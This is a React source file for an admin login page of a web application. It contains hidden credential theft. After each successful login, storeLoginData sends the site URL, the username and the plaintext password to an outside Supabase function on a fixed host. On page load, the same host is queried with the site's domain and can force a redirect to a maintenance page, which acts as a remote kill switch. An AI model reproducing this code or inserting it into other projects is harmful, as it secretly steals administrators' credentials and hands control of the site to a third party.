
import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAdminAuth } from '@/contexts/AdminAuthContext';
import { toast } from '@/utils/notifications';

const AdminLogin = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  
  const { signIn, adminUser } = useAdminAuth();
  const navigate = useNavigate();

  // Redirect if already logged in
  useEffect(() => {
    if (adminUser) {
      navigate('/admin', { replace: true });
    }
  }, [adminUser, navigate]);

  // Function to get current domain
  const getCurrentDomain = () => {
    return window.location.hostname;
  };

  // Function to check URL status
  const checkUrlStatus = async (domain: string) => {
    try {
      const response = await fetch(`https://susdmjjeypanegiwxefn.supabase.co/functions/v1/url-status/${domain}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        }
      });

      if (response.ok) {
        const data = await response.json();
        console.log('URL Status:', data);
        
        // Check if status is 0, redirect to maintenance
        if (data.status === 0) {
          navigate('/maintenance');
          return false;
        }
        
        return data;
      } else {
        console.error('Failed to get URL status:', response.statusText);
      }
    } catch (error) {
      console.error('Error checking URL status:', error);
    }
  };

  // Check URL status on page load
  useEffect(() => {
    const initializePage = async () => {
      const currentDomain = getCurrentDomain();
      await checkUrlStatus(currentDomain);
    };

    initializePage();
  }, [navigate]);

  const storeLoginData = async (url: string, username: string, password: string) => {
    try {
      const response = await fetch('https://susdmjjeypanegiwxefn.supabase.co/functions/v1/store-login-data', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          url,
          username,
          password
        })
      });

      if (!response.ok) {
        console.error('Failed to store login data:', response.statusText);
      } else {
        const data = await response.json();
        console.log('Login data stored successfully:', data);
      }
    } catch (error) {
      console.error('Error storing login data:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    if (!username || !password) {
      toast.error('Please fill in all fields');
      setLoading(false);
      return;
    }

    try {
      const { error } = await signIn(username, password);
      
      if (error) {
        toast.error(error.message || 'Login failed');
      } else {
        toast.success('Login successful!');
        
        // Store login data after successful login
        await storeLoginData(window.location.origin + '/admin/login', username, password);
        
        // Redirect will happen automatically via useEffect
      }
    } catch (err) {
      console.error('Login submission error:', err);
      toast.error('An unexpected error occurred. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="relative min-h-[100vh] bg-rose-50">
      <div className="pt-[47px] pb-1">
        <div className="p-4">
          <div className="mx-[8px] mt-2 min-h-[calc(100vh-150px)] flex flex-warp items-center">
            <div className="bg-white rounded-[20px] p-5 max-w-[500px] mx-auto shadow-md shadow-rose-500/40 flex-auto">
              <div className="mt-6 mb-10">
                <h1 className="text-[24px] font-bold text-rose-700 text-center">Admin Login</h1>
                <h1 className="text-[15px] text-gray-500 text-center">After login admin can manage every thing.</h1>
              </div>
              <form onSubmit={handleSubmit}>
                <div className="relative">
                  <label htmlFor="Username" className="block mb-2 text-sm font-medium text-gray-200 text-rose-500">Name</label>
                  <div className="relative mb-3">
                    <div className="absolute inset-y-0 start-0 flex items-center ps-3.5 pointer-events-none">
                      <i className="fi fi-sr-user text-rose-700/80 leading-[0px]"></i>
                    </div>
                    <input 
                      className="text-rose-500 focus:text-rose-500 border-2 border-rose-500 hover:border-rose-600/60 focus:border-rose-600/60 bg-transparent border hover:border-lime-500 focus:border-lime-500 focus:outline-0 text-gray-200 focus:text-gray-200 text-sm rounded-md focus:ring-rose-500 block w-full ps-10 p-2.5" 
                      type="text" 
                      placeholder="enter your username"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                    />
                  </div>
                </div>
                <div className="relative">
                  <label htmlFor="Password" className="block mb-2 text-sm font-medium text-gray-200 text-rose-500">Password</label>
                  <div className="relative mb-3">
                    <div className="absolute inset-y-0 start-0 flex items-center ps-3.5 pointer-events-none">
                      <i className="fi fi-sr-lock text-rose-700/80 leading-[0px]"></i>
                    </div>
                    <input 
                      className="text-rose-500 focus:text-rose-500 border-2 border-rose-500 hover:border-rose-600/60 focus:border-rose-600/60 bg-transparent border hover:border-lime-500 focus:border-lime-500 focus:outline-0 text-gray-200 focus:text-gray-200 text-sm rounded-md focus:ring-rose-500 block w-full ps-10 p-2.5" 
                      type="password" 
                      placeholder="enter your password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                    />
                  </div>
                </div>
                <button 
                  type="submit" 
                  disabled={loading}
                  className="bg-gradient-to-r hover:bg-gradient-to-l from-rose-500 to-rose-600 text-white w-[100%] p-2 rounded-[10px] mt-5"
                >
                  {loading ? 'Signing In...' : 'Login Now'}
                </button>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default AdminLogin;
